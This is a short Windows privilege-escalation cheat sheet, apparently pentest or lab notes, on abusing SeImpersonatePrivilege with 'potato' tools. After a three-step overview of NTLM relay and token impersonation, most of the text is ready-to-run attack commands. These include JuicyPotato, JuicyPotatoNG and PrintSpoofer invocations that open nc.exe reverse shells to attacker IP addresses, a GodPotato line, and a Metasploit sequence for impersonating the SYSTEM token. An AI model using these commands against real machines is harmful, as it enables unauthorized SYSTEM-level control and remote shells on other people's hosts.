And SeAssignPrimaryToken lol
#### High-level Overview
1. Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
```powershell
Privilege Name                          Description 
======================================= ====================================
SeImpersonatePrivilege                  Impersonate a client after authentication
```

#### Exploitation
[Juicy Potato](https://github.com/antonioCoco/JuicyPotatoNG)
```powershell
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\ProgramData\nc.exe 10.10.15.155 4443 -e cmd.exe" -t *

.\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\ProgramData\nc.exe 10.10.15.155 8443 -e cmd.exe" 
```

[GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)
```powershell
.\godpotato.exe -cmd "cmd /c whoami"
```

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)
```powershell
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

Meterpreter
Find [CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
```bash
background
use exploit/windows/local/ms16_075_reflection_juicy
set LHOST tun0
set LPORT 4443
set sessions 1

exploit

load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
shell
whoami
```